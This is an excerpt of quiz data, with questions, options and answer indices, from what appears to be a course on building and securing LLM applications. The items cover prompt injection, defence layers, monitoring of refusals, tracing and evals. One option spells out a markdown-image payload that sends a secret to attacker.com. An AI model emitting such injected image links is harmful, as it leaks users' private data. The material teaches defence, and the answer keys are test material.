    ...
    quiz: [
      {
        ...
        options: [
          "Because model providers don't expose a parameterized prompt API yet",
          "Because instructions and data share one token stream — there is no mechanism to mark part of the input as \"data only\"",
      ...
      },
      {
        ...
        options: [
          "Adding a classifier that scans incoming emails for injection phrases",
          ...
          "Breaking the trifecta — remove one of private data access, untrusted content, or external communication, e.g. by requiring human confirmation before any send",
        ],
        answer: 3,
      ...
      },
      {
        ...
        options: [
          "Markdown rendering executes embedded scripts by default",
          "An injected image reference like ![](https://attacker.com/?d=SECRET) causes the browser to fetch the URL automatically, leaking data with no visible link and no click",
    ...
    quiz: [
      {
        ...
        options: [
          "The action layer — authorization and confirmation enforced in the executor, because code is deterministic and text filters are probabilistic",
          "The input layer, since blocking bad requests early is cheapest",
      ...
      },
      {
        ...
        options: [
          "Asking the model to rate its own confidence from 0 to 100",
          "The length of the model's response",
          "Whether the model used a hedging word like \"probably\"",
          "Behavioral signals — disagreement across N samples, retrieval scores below threshold, NOT_FOUND emitted, or schema repair firing",
        ],
        answer: 3,
      ...
      },
      {
        ...
        options: [
          ...
          "Refusals return successfully, so they don't show up as errors — and users rarely file a bug saying \"it declined politely\"",
          "Safety classifiers are excluded from standard logging for privacy reasons",
          "False positives are mathematically rare in classifiers tuned for safety",
        ],
        answer: 1,
    ...
    quiz: [
      {
        ...
        options: [
          ...
          "Because a request spans several non-deterministic steps that can't be replayed, so the recorded trace is the only account of what actually happened",
          "Because it lets you retry the exact request deterministically",
        ],
        answer: 2,
      ...
      },
      {
        ...
        options: [
          "A jump in the schema repair rate — output shape drifting is a direct behavioral fingerprint of the model",
      ...
      },
      {
        ...
        options: [
          ...
          "Sample — all failures and flagged requests plus a small share of successes — with redaction at write time, short retention on payloads, and access controls",
        ],
        answer: 3,
    ...
    quiz: [
      {
        ...
        options: [
          "Cheaper models can't be prompted reliably enough to prototype with",
          "Because it establishes the ceiling — if the best model can't do the task, you have a product problem, not a prompt problem, and that's much cheaper to learn in week one",
      ...
      },
      {
        ...
        options: [
          ...
          "It forces you to define what \"correct\" means while the feature's scope can still change — and gives you a measurement from the very first prompt iteration",
        ],
        answer: 3,
      ...
      },
      {
        ...
        options: [
          "Adopting a comprehensive agent framework early",
          "Weekly reading and categorization of real failures, fixing the biggest category, and adding every case to the eval set",
